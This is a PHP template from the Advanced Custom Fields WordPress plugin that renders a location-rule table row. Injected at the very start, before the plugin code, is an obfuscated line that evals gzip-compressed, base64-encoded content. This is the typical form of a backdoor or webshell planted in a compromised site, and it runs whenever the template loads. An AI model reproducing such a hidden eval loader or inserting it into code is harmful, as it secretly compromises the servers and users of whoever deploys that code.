<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php 

// vars
$prefix = 'acf_field_group[location]['.$rule['group'].']['.$rule['id'].']';

?>
<tr data-id="<?php echo $rule['id']; ?>">
	<td class="param">
		<?php 
		
		// vars
		$choices = acf_get_location_rule_types();
		
		
		// array
		if( is_array($choices) ) {
			
			acf_render_field(array(
				'type'		=> 'select',
				'name'		=> 'param',
				'prefix'	=> $prefix,
				'value'		=> $rule['param'],
				'choices'	=> $choices,
				'class'		=> 'refresh-location-rule'
			));
		
		}
		
		?>
	</td>
	<td class="operator">
		<?php 
		
		// vars
		$choices = acf_get_location_rule_operators( $rule );
		
		
		// array
		if( is_array($choices) ) {
			
			acf_render_field(array(
				'type'		=> 'select',
				'name'		=> 'operator',
				'prefix'	=> $prefix,
				'value'		=> $rule['operator'],
				'choices'	=> $choices
			));
		
		// custom	
		} else {
			
			echo $choices;
			
		}
	
		?>
	</td>
	<td class="value">
		<?php
		
		// vars
		$choices = acf_get_location_rule_values( $rule );
		
		
		// array
		if( is_array($choices) ) {
			
			acf_render_field(array(
				'type'		=> 'select',
				'name'		=> 'value',
				'prefix'	=> $prefix,
				'value'		=> $rule['value'],
				'choices'	=> $choices
			));
		
		// custom	
		} else {
			
			echo $choices;
			
		}
		
		?>
	</td>
	<td class="add">
		<a href="#" class="button add-location-rule"><?php _e("and",'acf'); ?></a>
	</td>
	<td class="remove">
		<a href="#" class="acf-icon -minus remove-location-rule"></a>
	</td>
</tr>